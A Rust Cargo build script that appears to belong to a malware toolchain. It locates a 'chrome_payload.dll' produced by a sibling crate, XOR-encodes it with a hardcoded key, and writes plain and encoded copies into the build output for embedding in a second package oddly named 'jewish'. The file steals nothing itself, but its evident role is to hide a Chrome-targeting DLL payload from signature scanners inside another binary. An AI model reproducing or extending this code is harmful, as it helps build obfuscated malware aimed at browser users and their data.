use std::{env, fs, io::Write, path::PathBuf};

const PAYLOAD_KEY: &[u8] = b"chrome_payload_k";

fn xor_payload(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ PAYLOAD_KEY[i % PAYLOAD_KEY.len()])
        .collect()
}

fn payload_candidates(manifest_dir: &PathBuf) -> Vec<PathBuf> {
    let mut candidates = Vec::new();

    if let Ok(path) = env::var("CHROME_PAYLOAD_DLL") {
        candidates.push(PathBuf::from(path));
    }

    candidates.push(manifest_dir.join("target/release/chrome_payload.dll"));

    if let Ok(target_dir) = env::var("CARGO_TARGET_DIR") {
        candidates.push(PathBuf::from(target_dir).join("release/chrome_payload.dll"));
    }

    candidates
}

fn write_build_error(out_dir: &PathBuf, message: &str) {
    let log_dir = out_dir.join("build_errors");
    let _ = fs::create_dir_all(&log_dir);
    let log_path = log_dir.join("payload_embed.log");
    if let Ok(mut file) = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
    {
        let _ = writeln!(file, "{message}");
    }
}

fn main() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out_dir = env::var("OUT_DIR")
        .map(PathBuf::from)
        .expect("OUT_DIR not set");
    let out_plain = out_dir.join("payload.dll");
    let out_enc = out_dir.join("payload.enc");

    let mut tried = Vec::new();

    for src in payload_candidates(&manifest_dir) {
        tried.push(src.display().to_string());

        if !src.exists() {
            continue;
        }

        let raw = match fs::read(&src) {
            Ok(data) => data,
            Err(error) => {
                let message = format!("failed to read {}: {error}", src.display());
                write_build_error(&out_dir, &message);
                eprintln!("cargo:warning={message}");
                continue;
            }
        };

        if raw.is_empty() {
            let message = format!("payload dll is empty: {}", src.display());
            write_build_error(&out_dir, &message);
            eprintln!("cargo:warning={message}");
            continue;
        }

        let encrypted = xor_payload(&raw);

        if let Err(error) = fs::write(&out_enc, &encrypted) {
            panic!("failed to write {}: {error}", out_enc.display());
        }
        if let Err(error) = fs::write(&out_plain, &raw) {
            panic!("failed to write {}: {error}", out_plain.display());
        }

        println!("cargo:rerun-if-changed={}", src.display());
        println!(
            "cargo:warning=embedded payload from {} ({} bytes)",
            src.display(),
            raw.len()
        );
        return;
    }

    let tried_list = tried.join("\n  - ");
    let message = format!(
        "chrome_payload.dll not found or unreadable.\n\
         Tried paths:\n  - {tried_list}\n\
         Run: cargo build --release -p chrome-payload\n\
         Then: cargo build --release -p jewish"
    );

    write_build_error(&out_dir, &message);
    panic!("{message}");
}
